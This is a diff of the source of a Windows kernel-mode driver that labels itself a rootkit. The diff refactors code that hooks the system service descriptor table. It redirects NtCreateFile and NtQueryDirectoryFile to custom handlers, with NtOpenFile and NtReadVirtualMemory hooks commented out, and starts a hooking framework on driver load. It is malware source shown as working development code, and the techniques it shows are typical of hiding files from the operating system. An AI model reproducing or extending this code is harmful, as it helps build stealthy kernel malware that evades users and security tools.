@@ -19,12 +19,7 @@ bool rootkit_on = FALSE;
 void __fastcall call_back(unsigned long ssdt_index, void** ssdt_address)
 {
 				if (!rootkit_on) return;
-				UNREFERENCED_PARAMETER(ssdt_index);
-
-				if (*ssdt_address == g_NtCreateFile) *ssdt_address = MyNtCreateFile;
-				//else if (*ssdt_address == g_NtOpenFile) *ssdt_address = MyNtOpenFile;
-				//else if (*ssdt_address == g_NtReadVirtualMemory) *ssdt_address = MyNtReadVirtualMemory;
-				else if (*ssdt_address == g_NtQueryDirectoryFile) *ssdt_address = MyNtQueryDirectoryFile;
+				filter(ssdt_index, ssdt_address);
 }
 
 VOID DriverUnload(PDRIVER_OBJECT driver)
@@ -112,23 +107,6 @@ DriverEntry(
 				driver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = MyDisPatcher;
 				NTSTATUS status = MyCreateDevice(driver);
 				driver->DriverUnload = DriverUnload;
-
-				UNICODE_STRING str;
-				WCHAR name1[256]{ L"NtCreateFile" };
-				RtlInitUnicodeString(&str, name1);
-				g_NtCreateFile = (FNtCreateFile)MmGetSystemRoutineAddress(&str);
-
-				WCHAR name2[256]{ L"NtOpenFile" };
-				RtlInitUnicodeString(&str, name2);
-				g_NtOpenFile = (FNtOpenFile)MmGetSystemRoutineAddress(&str);
-
-				WCHAR name3[256]{ L"NtReadVirtualMemory" };
-				RtlInitUnicodeString(&str, name3);
-				g_NtReadVirtualMemory = (FNtReadVirtualMemory)MmGetSystemRoutineAddress(&str);
-
-				WCHAR name4[256]{ L"NtQueryDirectoryFile" };
-				RtlInitUnicodeString(&str, name4);
-				g_NtQueryDirectoryFile = (FNtQueryDirectoryFile)MmGetSystemRoutineAddress(&str);
-				
+				SetNtFunction();
 				return k_hook::initialize(call_back) && k_hook::start() ? STATUS_SUCCESS : STATUS_UNSUCCESSFUL;
 }
